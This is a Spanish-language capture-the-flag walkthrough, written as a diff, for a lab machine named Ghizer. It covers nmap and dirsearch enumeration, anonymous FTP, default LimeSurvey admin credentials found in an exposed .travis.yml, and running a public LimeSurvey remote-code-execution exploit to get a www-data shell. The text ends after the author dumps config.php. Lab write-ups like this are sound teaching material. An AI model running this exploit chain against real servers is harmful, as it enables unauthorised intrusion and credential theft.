@@ -1,1 +1,315 @@
 #Ghizer Walkthrough
+#Los cambios de ip en la máquina se deben a que la he completado en varios días, o al reinicio de la misma.
+
+Bueno, al comenzar el CTF veo que se llama Ghizer y el logo de Ghidra, asique intuyo que va a tener que ver con reversing.
+
+Comienzo con un escaneo general de puertos.
+
+sudo nmap -p- 10.130.138.217
+[sudo] contraseña para mksk:     
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-15 14:13 CEST
+Nmap scan report for 10.130.138.217
+Host is up (0.031s latency).
+Not shown: 65529 closed tcp ports (reset)
+PORT      STATE SERVICE
+21/tcp    open  ftp //posible login anónimo
+80/tcp    open  http
+443/tcp   open  https
+18002/tcp open  unknown
+32945/tcp open  unknown
+38369/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 14.88 seconds
+
+6 Puertos abiertos, continuo con un -sVC para una enumeración principal un poco más completa.
+
+ sudo nmap -sVC -p 21,80,443,18002,32945,38369 10.130.138.217
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-15 14:14 CEST
+Stats: 0:01:29 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 83.33% done; ETC: 14:16 (0:00:18 remaining)
+Stats: 0:02:27 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 83.33% done; ETC: 14:17 (0:00:29 remaining)
+Nmap scan report for 10.130.138.217
+Host is up (0.031s latency).
+
+PORT      STATE SERVICE    VERSION
+21/tcp    open  ftp?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest, X11Probe: 
+|     220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
+|     Please login with USER and PASS.
+|   Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|_    220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
+80/tcp    open  http       Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-generator: LimeSurvey http://www.limesurvey.org
+|_http-title:         LimeSurvey    
+443/tcp   open  ssl/http   Apache httpd 2.4.18 ((Ubuntu))
+|_http-generator: WordPress 5.4.2
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=ubuntu
+| Not valid before: 2020-07-23T17:27:31
+|_Not valid after:  2030-07-21T17:27:31
+|_http-title: Ghizer &#8211; Just another WordPress site
+18002/tcp open  java-rmi   Java RMI
+| rmi-dumpregistry: 
+|   jmxrmi
+|     javax.management.remote.rmi.RMIServerImpl_Stub
+|     @127.0.1.1:32945
+|     extends
+|       java.rmi.server.RemoteStub
+|       extends
+|_        java.rmi.server.RemoteObject
+32945/tcp open  java-rmi   Java RMI
+38369/tcp open  tcpwrapped
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port21-TCP:V=7.94SVN%I=7%D=8/15%Time=6A805849%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,33,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\
+SF:x203\.0\.3\)\n")%r(GenericLines,58,"220\x20Welcome\x20to\x20Anonymous\x
+SF:20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20wit
+SF:h\x20USER\x20and\x20PASS\.\n")%r(Help,58,"220\x20Welcome\x20to\x20Anony
+SF:mous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\
+SF:x20with\x20USER\x20and\x20PASS\.\n")%r(GetRequest,58,"220\x20Welcome\x2
+SF:0to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Plea
+SF:se\x20login\x20with\x20USER\x20and\x20PASS\.\n")%r(HTTPOptions,58,"220\
+SF:x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)
+SF:\n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n")%r(RTSPReq
+SF:uest,58,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd
+SF:\x203\.0\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\
+SF:n")%r(RPCCheck,33,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x
+SF:20\(vsFTPd\x203\.0\.3\)\n")%r(DNSVersionBindReqTCP,58,"220\x20Welcome\x
+SF:20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Ple
+SF:ase\x20login\x20with\x20USER\x20and\x20PASS\.\n")%r(DNSStatusRequestTCP
+SF:,58,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x20
+SF:3\.0\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n")%
+SF:r(SSLSessionReq,33,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\
+SF:x20\(vsFTPd\x203\.0\.3\)\n")%r(TerminalServerCookie,33,"220\x20Welcome\
+SF:x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n")%r(TLSS
+SF:essionReq,33,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(v
+SF:sFTPd\x203\.0\.3\)\n")%r(Kerberos,33,"220\x20Welcome\x20to\x20Anonymous
+SF:\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n")%r(SMBProgNeg,33,"220\x20
+SF:Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n"
+SF:)%r(X11Probe,58,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20
+SF:\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x2
+SF:0PASS\.\n")%r(FourOhFourRequest,58,"220\x20Welcome\x20to\x20Anonymous\x
+SF:20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20wit
+SF:h\x20USER\x20and\x20PASS\.\n");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 163.07 seconds
+
+
+Interesante, tengo login anónimo ftp, un wordpress en el 443 y algo custom en el 38369.
+
+Voy a comenzar por ftp.
+
+Al conectarme y probar comandos, se desconecta, asique entro en modo pasivo.
+
+ftp 10.130.138.217
+Connected to 10.130.138.217.
+220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
+Name (10.130.138.217:mksk): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> passive
+Passive mode: off; fallback to active mode: off.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwx------    1 0        0            1024  Dec 12  2019 client.py
+-r-x------    1 0        0            5513  Nov 28  2019 test.c
+-rw-------    1 0        0            54324 Feb 7   2019 prototype.c
+-r-x------    1 0        0            1351  Feb 7   2019 root.txt
+-r-x------    1 0        0            4096  Dec 12  2019 user.txt
+-rw-------    1 0        0            54324 Jan 4   2019 i_honeypot.py
+226 Directory send OK.
+
+Bueno, dos flags, y 4 archivos interesantes.
+
+Tras probar varios comandos, es posible que como dice el archivo i_honeypot.py, esto sea un honeypot. 
+
+Voy al puerto 80.
+
+Enumero subdirectorios.
+
+sudo dirsearch -u http://10.130.138.217/
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/mksk/reports/http_10.130.138.217/__26-08-15_14-23-09.txt
+
+Target: http://10.130.138.217/
+
+[14:23:09] Starting: 
+[14:23:10] 200 -   35B  - /.bowerrc
+[14:23:11] 200 -  497B  - /.editorconfig
+[14:23:12] 200 -  429B  - /.gitattributes
+[14:23:12] 200 -    3KB - /.gitignore
+[14:23:12] 403 -  279B  - /.ht_wsr.txt
+[14:23:12] 403 -  279B  - /.htaccess.bak1
+[14:23:12] 403 -  279B  - /.htaccess.orig
+[14:23:12] 403 -  279B  - /.htaccess.sample
+[14:23:12] 403 -  279B  - /.htaccess.save
+[14:23:12] 403 -  279B  - /.htaccess_extra
+[14:23:12] 403 -  279B  - /.htaccess_orig
+[14:23:12] 403 -  279B  - /.htaccess_sc
+[14:23:12] 403 -  279B  - /.htaccessOLD2
+[14:23:12] 403 -  279B  - /.htaccessBAK
+[14:23:12] 403 -  279B  - /.htaccessOLD
+[14:23:12] 403 -  279B  - /.htm
+[14:23:12] 403 -  279B  - /.html
+[14:23:12] 403 -  279B  - /.htpasswd_test
+[14:23:12] 403 -  279B  - /.htpasswds
+[14:23:12] 403 -  279B  - /.httr-oauth
+[14:23:13] 403 -  279B  - /.php
+[14:23:13] 403 -  279B  - /.php3
+[14:23:13] 200 -    2KB - /.scrutinizer.yml
+[14:23:13] 200 -    4KB - /.travis.yml
+[14:23:15] 301 -  316B  - /admin  ->  http://10.130.138.217/admin/
+[14:23:15] 302 -    0B  - /admin/  ->  ../index.php/admin
+[14:23:15] 302 -    0B  - /admin/admin.php  ->  ../index.php/admin
+[14:23:16] 302 -    0B  - /admin/index.php  ->  ../index.php/admin
+[14:23:20] 301 -  322B  - /application  ->  http://10.130.138.217/application/
+[14:23:20] 200 -  109B  - /application/
+[14:23:20] 200 -  109B  - /application/logs/
+[14:23:20] 301 -  317B  - /assets  ->  http://10.130.138.217/assets/
+[14:23:20] 200 -  496B  - /assets/
+[14:23:22] 200 -    1KB - /composer.json
+[14:23:22] 200 -    3KB - /CONTRIBUTING.md
+[14:23:23] 301 -  315B  - /docs  ->  http://10.130.138.217/docs/
+[14:23:23] 200 -  612B  - /docs/
+[14:23:26] 404 -    5KB - /index.php/login/
+[14:23:27] 301 -  320B  - /installer  ->  http://10.130.138.217/installer/
+[14:23:28] 200 -   80B  - /manifest.yml
+[14:23:32] 200 -  186B  - /phpunit.xml
+[14:23:32] 301 -  318B  - /plugins  ->  http://10.130.138.217/plugins/
+[14:23:32] 200 -  109B  - /plugins/
+[14:23:33] 200 -    2KB - /README.md
+[14:23:34] 403 -  279B  - /server-status
+[14:23:34] 403 -  279B  - /server-status/
+[14:23:37] 301 -  316B  - /tests  ->  http://10.130.138.217/tests/
+[14:23:37] 200 -  683B  - /tests/
+[14:23:37] 200 -  473B  - /themes/
+[14:23:37] 301 -  317B  - /themes  ->  http://10.130.138.217/themes/
+[14:23:37] 301 -  314B  - /tmp  ->  http://10.130.138.217/tmp/
+[14:23:37] 200 -  215B  - /tmp/
+[14:23:37] 301 -  317B  - /upload  ->  http://10.130.138.217/upload/
+[14:23:37] 200 -  517B  - /upload/
+
+Vale, tengo panel de admin, y varios archivos de configuración expuestos.
+
+.bowerrc, .editorconfig, .gitattributes, .gitignore
+.travis.yml, .scrutinizer.yml
+composer.json, phpunit.xml, manifest.yml
+
+En .travis.yaml veo php application/commands/console.php install admin password TravisLS no@email.com verbose.
+
+Las credenciales están puestas por defecto. Me dirijo a /admin y me logueo.
+
+Tras conseguir acceso, busco un poco, puedo acceder a la base de datos interna, pero no consigo nada.
+Me doy cuenta de que la versión está en la esquina inferior derecha, y uso searchsploit.
+
+mksk@mksk-Nitro-AN515-57:~$ searchsploit LimeSurvey 3.15.9
+-------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                        |  Path
+-------------------------------------------------------------------------------------- ---------------------------------
+LimeSurvey < 3.16 - Remote Code Execution                                             | php/webapps/46634.py
+-------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+Bueno, pues hay una vulnerabilidad que me da RCE, el script es de python2, asique me voy a mi carpeta con python2, y lo ejecuto alli.
+
+~/vol2$ python2 script.py http://10.130.138.217 admin password
+[*] Logging in to LimeSurvey...
+[*] Creating a new Survey...
+[+] SurveyID: 215814
+[*] Uploading a malicious PHAR...
+[*] Sending the Payload...
+[*] TCPDF Response: <strong>TCPDF ERROR: </strong>[Image] Unable to get the size of the image: phar://./upload/surveys/215814/files/malicious.jpg
+[+] Pwned! :)
+[+] Getting the shell...
+$ 
+
+Tengo una shell, soy www-data y cd no funciona es esta shell. Voy a buscar persistencia.
+
+Mientras exploro un poco me encuentro la primera flag.
+
+$ cat application/config/config.php
+<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
+/*
+| -------------------------------------------------------------------
+| DATABASE CONNECTIVITY SETTINGS
+| -------------------------------------------------------------------
+| This file will contain the settings needed to access your database.
+|
+| For complete instructions please consult the 'Database Connection'
+| page of the User Guide.
+|
+| -------------------------------------------------------------------
+| EXPLANATION OF VARIABLES
+| -------------------------------------------------------------------
+|
+|    'connectionString' Hostname, database, port and database type for 
+|     the connection. Driver example: mysql. Currently supported:
+|                 mysql, pgsql, mssql, sqlite, oci
+|    'username' The username used to connect to the database
+|    'password' The password used to connect to the database
+|    'tablePrefix' You can add an optional prefix, which will be added
+|                 to the table name when using the Active Record class
+|
+*/
+return array(
+	'components' => array(
+		'db' => array(
+			'connectionString' => 'mysql:host=localhost;port=3306;dbname=limedb;',
+			'emulatePrepare' => true,
+			'username' => 'A***',
+			'password' => '*************',
+			'charset' => 'utf8mb4',
+			'tablePrefix' => 'lime_',
+		),
+		
+		// Uncomment the following lines if you need table-based sessions.
+		// Note: Table-based sessions are currently not supported on MSSQL server.
+		// 'session' => array (
+			// 'class' => 'application.core.web.DbHttpSession',
+			// 'connectionID' => 'db',
+			// 'sessionTableName' => '{{sessions}}',
+		// ),
+		
+		'urlManager' => array(
+			'urlFormat' => 'path',
+			'rules' => array(
+				// You can add your own rules here
+			),
+			'showScriptName' => true,
+		),
+	
+	),
+	// For security issue : it's better to set runtimePath out of web access
+	// Directory must be readable and writable by the webuser
+	// 'runtimePath'=>'/var/limesurvey/runtime/'
+	// Use the following config variable to set modified optional settings copied from config-defaults.php
+	'config'=>array(
+	// debug: Set this to 1 if you are looking for errors. If you still get no errors after enabling this
+	// then please check your error-logs - either in your hosting provider admin panel or in some /logs directory
+	// on your webspace.
+	// LimeSurvey developers: Set this to 2 to additionally display STRICT PHP error messages and get full access to standard templates
+		'debug'=>0,
+		'debugsql'=>0, // Set this to 1 to enanble sql logging, only active when debug = 2
+		// Update default LimeSurvey config here
+	)
+);
+/* End of file config.php */
+/* Location: ./application/config/config.php */
